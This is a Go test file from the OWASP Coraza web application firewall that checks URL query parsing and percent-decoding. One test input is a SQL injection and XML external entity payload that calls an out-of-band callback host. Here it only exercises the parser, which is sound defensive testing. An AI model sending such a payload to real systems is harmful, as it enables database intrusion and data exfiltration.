// Copyright 2022 Juan Pablo Tosso and the OWASP Coraza contributors
// SPDX-License-Identifier: Apache-2.0

package url

import (
	"testing"
)

func TestUrlPayloads(t *testing.T) {
	out := `var=EmptyValue'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % awpsd SYSTEM "http://0cddnr5evws01h2bfzn5zd0cm3sxvrjv7oufi4.example'||'foo.bar/">%awpsd;`
	q := ParseQuery(out, '&')
	if len(q["var"]) == 0 {
		t.Error("var is empty")
	}
}

func TestQueryUnescape(t *testing.T) {
	payloads := map[string]string{
		"sample":    "sample",
		"s%20ample": "s ample",
		"s+ample":   "s ample",
		"s%2fample": "s/ample",
		"s% ample":  "s% ample",  // non-strict sample
		"s%ssample": "s%ssample", // non-strict sample
		"s%00ample": "s\x00ample",
	}
	for k, v := range payloads {
		if out := QueryUnescape(k); out != v {
			t.Errorf("Error parsing %q, got %q and expected %q", k, out, v)
		}
	}
}
